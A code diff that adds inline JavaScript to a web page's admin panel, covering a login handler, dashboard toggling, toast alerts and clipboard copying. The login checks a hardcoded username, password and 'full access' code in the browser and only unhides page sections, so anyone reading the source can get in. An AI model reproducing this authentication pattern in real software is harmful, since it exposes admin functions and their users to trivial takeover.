+            let fullCode = document.getElementById('adminFullAccessCode').value.trim();
+
+            if (uid === 'sumon' && pass === '1234') {
+                isAdminLoggedIn = true;
+                if (fullCode === '8016') {
+                    isFullAccess = true;
+                    showAlert('Full Access Admin Login Successful!');
+                    document.getElementById('adminPanelTitle').innerHTML = `<i class="fa-solid fa-shield-halved text-amber-500"></i> Full Access Admin Dashboard`;
+                    document.getElementById('fullAccessSettingsSection').classList.remove('hidden');
+                    document.getElementById('fullAccessYtSection').classList.remove('hidden');
+                } else {
+                    isFullAccess = false;
+                    showAlert('Normal Admin Login Successful! (App Publish Only)');
+                    document.getElementById('adminPanelTitle').innerHTML = `<i class="fa-solid fa-gear text-indigo-500"></i> App Publisher Dashboard`;
+                    document.getElementById('fullAccessSettingsSection').classList.add('hidden');
+                    document.getElementById('fullAccessYtSection').classList.add('hidden');
+                }
+
+                closeAdminLogin();
+                document.getElementById('adminUserId').value = '';
+                document.getElementById('adminPass').value = '';
+                document.getElementById('adminFullAccessCode').value = '';
+                
+                document.getElementById('adminDashboardModal').classList.remove('hidden');
+                document.getElementById('adminDashboardModal').classList.add('flex');
+                renderApps(appsData);
+                renderYouTubePosts();
+            } else {
+                showAlert('Invalid User ID or Password!');
+            }
+        };
+
+        window.closeAdminDashboard = () => {
+            document.getElementById('adminDashboardModal').classList.remove('flex');
+            document.getElementById('adminDashboardModal').classList.add('hidden');
+        };
+
+        window.showAlert = (msg) => {
+            const toast = document.getElementById('toast');
+            document.getElementById('toastMessage').innerText = msg;
+            toast.classList.remove('opacity-0', 'pointer-events-none');
+            toast.classList.add('opacity-100');
+            setTimeout(() => {
+                toast.classList.remove('opacity-100');
+                toast.classList.add('opacity-0', 'pointer-events-none');
+            }, 2500);
+        };
+
+        window.copyPostInfo = (btn, text) => {
+            navigator.clipboard.writeText(text).then(() => {
+                let originalHTML = btn.innerHTML;
+                btn.innerHTML = `<i class="fa-solid fa-check"></i> Copied!`;
+                btn.classList.remove('bg-blue-600', 'hover:bg-blue-500');
+                btn.classList.add('bg-emerald-600');
+                setTimeout(() => {
+                    btn.innerHTML = originalHTML;
+                    btn.classList.remove('bg-emerald-600');
+                    btn.classList.add('bg-blue-600', 'hover:bg-blue-500');
+                }, 2000);
+                showAlert('Info copied to clipboard!');
+            });
+        };
+    </script>
 </body>
-
 </html>
